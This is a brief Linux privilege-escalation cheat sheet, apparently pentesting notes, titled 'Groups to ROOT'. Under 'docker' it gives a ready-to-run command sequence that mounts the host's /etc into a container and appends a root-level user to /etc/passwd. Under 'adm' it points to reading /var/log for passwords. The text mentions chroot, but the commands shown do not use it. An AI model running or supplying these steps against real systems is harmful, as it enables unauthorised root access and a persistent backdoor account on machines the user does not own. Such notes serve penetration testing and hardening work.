# Groups to ROOT

## Groups that lead to ROOT

> If the low priv shell is member of one the following groups we can upgrade to root.

### docker

We can mount the full file system of the host to gain access to the full system then `chroot` to gain full privileges on the host:

```bash
docker run -v /etc/:/mnt -it alpine
cd /mnt
echo 'user:saltpasswd:0:0::/root:/bin/bash' >>passwd
tail passwd
su user
#type password and get root
```

### adm

```bash
We can see all the logs on /var/log. Might contain passwords.
```
